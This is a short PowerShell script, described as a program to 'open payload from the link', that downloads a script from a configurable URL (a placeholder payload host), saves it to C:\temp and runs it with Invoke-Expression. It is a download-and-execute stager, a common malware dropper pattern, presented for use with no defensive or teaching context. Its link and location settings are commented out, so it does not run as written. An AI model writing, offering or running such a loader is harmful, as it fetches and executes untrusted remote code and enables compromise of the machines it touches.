.DESCRIPTION 
	This program is designed to open payload from the link.

# Enter your link to the script ↓
# $link = "https://link.payload.example"

# Download location
# $location = "C:\temp"

# Using Invoke-WebRequest to download the raw data
$response = Invoke-WebRequest -Uri $link

# Check if the request was successful
if ($response.StatusCode -eq 200) {
    # Construct the full path for the script
    $scriptPath = Join-Path -Path $location -ChildPath "DownloadedScript.ps1"

    # Save the raw data to the specified script file
    $response.Content | Out-File -FilePath $scriptPath -Force

    # Run the downloaded script using Invoke-Expression
    Invoke-Expression -Command "& `"$scriptPath`""
} else {
    Write-Host "Failed to download raw data. HTTP status code: $($response.StatusCode)"
}
